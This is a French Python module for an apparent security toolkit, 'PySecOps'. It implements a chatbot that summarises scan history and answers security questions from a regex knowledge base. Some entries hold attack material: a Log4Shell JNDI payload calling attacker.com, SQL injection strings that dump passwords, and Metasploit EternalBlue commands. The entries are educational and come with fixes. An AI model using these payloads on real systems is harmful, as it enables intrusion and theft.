"""
PySecOps — Assistant intelligent connecté aux résultats
Lit les données réelles de la DB et explique en français.
"""
import re
import requests
import urllib.parse
from app.utils.db_utils import get_stats, get_historique_complet


# ─────────────────────────────────────────────
# ANALYSE DES RÉSULTATS RÉELS
# ─────────────────────────────────────────────

def analyser_contexte() -> dict:
    """
    Lit la base de données et construit un contexte
    des analyses effectuées sur PySecOps.
    """
    stats     = get_stats()
    historique = get_historique_complet()

    contexte = {
        "total_analyses": stats.get("total", 0),
        "modules_utilises": [],
        "derniers_scans": [],
        "alertes_actives": [],
    }

    # Modules utilisés
    modules_map = {
        "ports":       "Port Scanner",
        "owasp":       "Web Audit OWASP",
        "ids":         "IDS / Forensique",
        "recon_scan":  "Deep Recon",
        "threat":      "Threat Intelligence",
        "nmap_import": "Import Nmap XML",
        "logs":        "Log Analyzer",
        "osint_emails":"OSINT Engine",
        "whois":       "WHOIS & DNS",
        "ssl":         "SSL Scanner",
    }

    for cle, nom in modules_map.items():
        if stats.get(cle, 0) > 0:
            contexte["modules_utilises"].append({
                "nom": nom,
                "nb":  stats[cle],
            })

    # Derniers scans
    for a in historique[:5]:
        contexte["derniers_scans"].append({
            "module": a.get("module", ""),
            "detail": a.get("detail", ""),
            "date":   a.get("date", ""),
            "heure":  a.get("heure", ""),
        })

    # Alertes actives
    if stats.get("owasp", 0) > 0:
        contexte["alertes_actives"].append(
            f"{stats['owasp']} audit(s) web OWASP effectué(s) — vérifiez les vulnérabilités"
        )
    if stats.get("ids", 0) > 0:
        contexte["alertes_actives"].append(
            f"{stats['ids']} analyse(s) IDS — vérifiez la timeline d'attaque"
        )
    if stats.get("threat", 0) > 0:
        contexte["alertes_actives"].append(
            f"{stats['threat']} analyse(s) de réputation IP/domaine"
        )

    return contexte


def generer_rapport_contexte(contexte: dict) -> str:
    """Génère un rapport textuel du contexte PySecOps."""
    if contexte["total_analyses"] == 0:
        return "Aucune analyse effectuée sur PySecOps pour l'instant."

    rapport = f"Sur PySecOps, {contexte['total_analyses']} analyse(s) ont été effectuées.\n\n"

    if contexte["modules_utilises"]:
        rapport += "**Modules utilisés :**\n"
        for m in contexte["modules_utilises"]:
            rapport += f"- {m['nom']} : {m['nb']} fois\n"
        rapport += "\n"

    if contexte["alertes_actives"]:
        rapport += "**Points d'attention :**\n"
        for a in contexte["alertes_actives"]:
            rapport += f"- {a}\n"
        rapport += "\n"

    if contexte["derniers_scans"]:
        dernier = contexte["derniers_scans"][0]
        rapport += f"**Dernière analyse :** {dernier['module']} "
        rapport += f"sur {dernier['detail']} le {dernier['date']} à {dernier['heure']}"

    return rapport


# ─────────────────────────────────────────────
# BASE DE CONNAISSANCES LOCALE
# ─────────────────────────────────────────────

CONNAISSANCES = {
    r"xss|cross.site.script": {
        "titre": "XSS — Cross-Site Scripting",
        "reponse": "Injection de JavaScript malveillant dans une page web.\n\n**Types :**\n- Réfléchi : payload dans l'URL\n- Stocké : sauvegardé en base de données\n- DOM : manipulation côté client\n\n**Protection :**\n- Échapper les sorties HTML\n- Content Security Policy (CSP)\n- Flag httpOnly sur les cookies",
        "categorie": "Attaque Web",
        "lien": "https://owasp.org/www-community/attacks/xss/"
    },
    r"sql.inject|sqli": {
        "titre": "Injection SQL",
        "reponse": "Insertion de code SQL malveillant pour manipuler la base de données.\n\n**Payload classique :**\n```\nadmin OR 1=1 --\nUNION SELECT username,password FROM users\n```\n\n**Protection :**\n- Requêtes préparées (PDO, PreparedStatement)\n- ORM (SQLAlchemy)\n- Validation stricte des entrées",
        "categorie": "Attaque Web",
        "lien": "https://owasp.org/www-community/attacks/SQL_Injection"
    },
    r"log4shell|log4j|cve-2021-44228": {
        "titre": "Log4Shell — CVE-2021-44228 (CVSS 10.0)",
        "reponse": "Vulnérabilité critique dans Log4j2 permettant une RCE via JNDI lookup.\n\n**Payload :**\n```\n${jndi:ldap://attacker.com:1389/exploit}\n```\n\n**Correction :**\n- Mettre à jour Log4j2 vers 2.17.1+\n- Désactiver les lookups JNDI",
        "categorie": "CVE Critique",
        "lien": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
    },
    r"nmap|scanner.*port": {
        "titre": "Nmap — Scanner réseau",
        "reponse": "**Commandes essentielles :**\n\n```bash\nnmap -sV -sC -oX scan.xml cible.com\nnmap -p- --min-rate 5000 cible.com\nnmap -sU --top-ports 100 cible.com\nnmap --script vuln cible.com\n```\n\nPour importer dans PySecOps : utilisez `-oX` pour générer un fichier XML.",
        "categorie": "Outils",
        "lien": "https://nmap.org/book/man.html"
    },
    r"metasploit|msf": {
        "titre": "Metasploit Framework",
        "reponse": "**Commandes de base :**\n\n```bash\nmsfconsole\nmsf> search eternalblue\nmsf> use exploit/windows/smb/ms17_010_eternalblue\nmsf> set RHOSTS 192.168.1.100\nmsf> exploit\n```",
        "categorie": "Outils",
        "lien": "https://docs.metasploit.com/"
    },
    r"burp|burp suite": {
        "titre": "Burp Suite — Proxy HTTP",
        "reponse": "**Modules essentiels :**\n\n- **Proxy** : intercepte les requêtes HTTP\n- **Repeater** : rejoue et modifie les requêtes\n- **Intruder** : attaques automatisées\n- **Scanner** : détection auto de vulnérabilités\n\n**Workflow :** Configurer proxy 127.0.0.1:8080 → Intercepter → Send to Repeater",
        "categorie": "Outils",
        "lien": "https://portswigger.net/burp/documentation"
    },
    r"osint|reconnaissance passive": {
        "titre": "OSINT — Open Source Intelligence",
        "reponse": "**Sources gratuites :**\n\n```\ncrt.sh       → sous-domaines SSL\nShodan.io    → services exposés\nHunter.io    → emails professionnels\nSpiderFoot   → OSINT automatisé\n```\n\nTout est disponible dans le module OSINT Engine de PySecOps.",
        "categorie": "Reconnaissance",
        "lien": "https://osintframework.com/"
    },
    r"owasp|top 10|top10": {
        "titre": "OWASP Top 10 — 2021",
        "reponse": "**Les 10 risques web les plus critiques :**\n\n1. Broken Access Control\n2. Cryptographic Failures\n3. Injection (SQL, XSS, SSTI)\n4. Insecure Design\n5. Security Misconfiguration\n6. Vulnerable Components\n7. Auth Failures\n8. Integrity Failures\n9. Logging Failures\n10. SSRF\n\nPySecOps vérifie 12 headers HTTP via le module Web Audit OWASP.",
        "categorie": "Standards",
        "lien": "https://owasp.org/Top10/"
    },
    r"pentest|test.*intrusion|methodolog": {
        "titre": "Méthodologie Pentest — PTES",
        "reponse": "**7 phases PTES :**\n\n1. Pre-engagement — périmètre et autorisation\n2. Intelligence Gathering — OSINT passif\n3. Threat Modeling — actifs critiques\n4. Vulnerability Analysis — CVE lookup\n5. Exploitation — PoC contrôlés\n6. Post-Exploitation — élévation de privilèges\n7. Reporting — findings + CVSS + remédiation\n\nPySecOps couvre les phases 2, 3, 4 et 7.",
        "categorie": "Méthodologie",
        "lien": "http://www.pentest-standard.org/"
    },
    r"ransomware|rançon": {
        "titre": "Ransomware",
        "reponse": "**Protection :**\n\n- Sauvegardes 3-2-1 (3 copies, 2 supports, 1 hors-site)\n- Patch management régulier\n- MFA sur tous les accès distants\n- EDR sur les postes\n- Segmentation réseau\n- Formation anti-phishing",
        "categorie": "Malware",
        "lien": "https://www.cisa.gov/stopransomware"
    },
    r"cvss|score.*vulner|criticite": {
        "titre": "Score CVSS — Comment le lire ?",
        "reponse": "**Échelle CVSS (0-10) :**\n\n```\n0.0       → Aucun risque\n0.1 - 3.9  → BASSE\n4.0 - 6.9  → MOYENNE\n7.0 - 8.9  → HAUTE\n9.0 - 10.0 → CRITIQUE\n```\n\nUn score CVSS 9.8 (comme Log4Shell) signifie qu'une exploitation est triviale et l'impact maximal.",
        "categorie": "Standards",
        "lien": "https://nvd.nist.gov/vuln-metrics/cvss"
    },
    r"mes.*(résultat|analyse|scan|rapport)|qu.*as.*(trouvé|détect)|mon.*(scan|analyse)": {
        "titre": "Vos résultats PySecOps",
        "reponse": "__CONTEXTE__",
        "categorie": "PySecOps",
        "lien": ""
    },
    r"que.*faire|comment.*(corriger|remédier|sécuris)|priorité|urgent": {
        "titre": "Que faire maintenant ?",
        "reponse": "__ACTIONS__",
        "categorie": "PySecOps",
        "lien": ""
    },
}

REPONSE_DEFAUT = {
    "titre":    "Recherche en cours...",
    "reponse":  "Je cherche des informations sur ce sujet.",
    "categorie":"Recherche",
    "lien":     "",
}


def rechercher_ddg(question: str) -> dict:
    """Cherche sur DuckDuckGo HTML (gratuit, sans clé)."""
    try:
        query = "cybersécurité " + question
        url   = "https://html.duckduckgo.com/html/?q=" + urllib.parse.quote(query)
        r     = requests.get(
            url,
            headers={"User-Agent": "Mozilla/5.0"},
            timeout=8
        )
        snippets = re.findall(
            r'class="result__snippet"[^>]*>(.*?)</a>',
            r.text, re.DOTALL
        )[:4]
        liens_raw = re.findall(
            r'class="result__a"[^>]*href="([^"]+)"[^>]*>(.*?)</a>',
            r.text, re.DOTALL
        )[:4]

        textes = []
        for s in snippets:
            s = re.sub(r'<[^>]+>', '', s).strip()
            if len(s) > 30:
                textes.append(s)

        liens = []
        for href, titre in liens_raw:
            titre = re.sub(r'<[^>]+>', '', titre).strip()
            if titre and href:
                liens.append({"titre": titre[:60], "url": href})

        if textes:
            reponse = f"**Résultats pour : {question}**\n\n"
            for i, t in enumerate(textes[:3], 1):
                reponse += f"{i}. {t}\n\n"
            if liens:
                reponse += "\n**Sources :**\n"
                for l in liens[:3]:
                    reponse += f"- [{l['titre']}]({l['url']})\n"
            return {
                "titre":    f"Recherche : {question}",
                "reponse":  reponse,
                "categorie":"Recherche Web",
                "lien":     liens[0]["url"] if liens else "",
            }
    except Exception:
        pass

    return {
        "titre":    question,
        "reponse":  f"Consultez directement :\n- [Google](https://www.google.com/search?q=cybersecurite+{urllib.parse.quote(question)})\n- [OWASP](https://owasp.org)\n- [NVD NIST](https://nvd.nist.gov)",
        "categorie":"Aide",
        "lien":     f"https://www.google.com/search?q=cybersecurite+{urllib.parse.quote(question)}",
    }


def repondre_intelligent(question: str) -> dict:
    """
    Répond intelligemment :
    1. Questions sur VOS résultats → lit la DB
    2. Questions connues → base locale
    3. Autres → DuckDuckGo
    """
    q = question.lower().strip()

    for pattern, rep in CONNAISSANCES.items():
        if re.search(pattern, q, re.IGNORECASE):
            # Réponses dynamiques connectées à la DB
            if rep["reponse"] == "__CONTEXTE__":
                contexte = analyser_contexte()
                rapport  = generer_rapport_contexte(contexte)
                return {
                    "titre":    "Vos résultats PySecOps",
                    "reponse":  rapport,
                    "categorie":"PySecOps",
                    "lien":     "/",
                    "contexte": True,
                }
            if rep["reponse"] == "__ACTIONS__":
                contexte = analyser_contexte()
                actions  = _generer_actions(contexte)
                return {
                    "titre":    "Actions recommandées",
                    "reponse":  actions,
                    "categorie":"PySecOps",
                    "lien":     "/",
                    "contexte": True,
                }
            return rep

    return rechercher_ddg(question)


def _generer_actions(contexte: dict) -> str:
    """Génère des actions concrètes basées sur le contexte."""
    if contexte["total_analyses"] == 0:
        return (
            "Vous n'avez pas encore effectué d'analyses sur PySecOps.\n\n"
            "**Par où commencer :**\n"
            "1. Lancez un **Deep Recon** sur votre cible\n"
            "2. Importez un fichier **Nmap XML** si vous avez déjà scanné\n"
            "3. Uploadez vos **logs serveur** pour détecter les intrusions\n"
            "4. Utilisez le **Web Audit OWASP** pour auditer votre application"
        )

    actions = "**Actions recommandées basées sur vos analyses :**\n\n"

    for alerte in contexte["alertes_actives"]:
        actions += f"⚠️ {alerte}\n"

    actions += "\n**Prochaines étapes :**\n"

    modules_utilises = [m["nom"] for m in contexte["modules_utilises"]]

    if "Web Audit OWASP" in modules_utilises:
        actions += "1. Consultez les résultats OWASP et corrigez les headers manquants\n"
    if "IDS / Forensique" in modules_utilises:
        actions += "2. Vérifiez la timeline d'attaque dans l'IDS et bloquez les IPs hostiles\n"
    if "Port Scanner" in modules_utilises:
        actions += "3. Fermez les ports dangereux exposés inutilement\n"
    if "Import Nmap XML" in modules_utilises:
        actions += "4. Patcher les CVEs critiques identifiées dans le scan Nmap\n"

    actions += "\n➡️ Générez un **rapport PTES** pour documenter toutes les findings."
    return actions
